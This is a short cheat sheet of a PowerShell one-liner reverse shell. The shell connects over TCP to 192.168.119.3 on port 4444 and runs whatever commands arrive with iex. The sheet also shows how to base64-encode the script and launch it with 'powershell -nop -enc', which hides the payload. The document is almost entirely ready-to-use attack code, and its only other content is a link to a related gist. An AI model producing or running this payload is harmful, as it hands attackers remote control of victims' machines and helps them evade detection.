# PowerShell One Liner Reverse Shells

## Reverse TCP

```
PS C:\> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS C:\> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS C:\> $EncodedText = [Convert]::ToBase64String($Bytes)

PS C:\> $EncodedText
```

Then can plug into `powershell -nop -enc BASE64J3D769S7+HK67JH5FS=`


See also https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3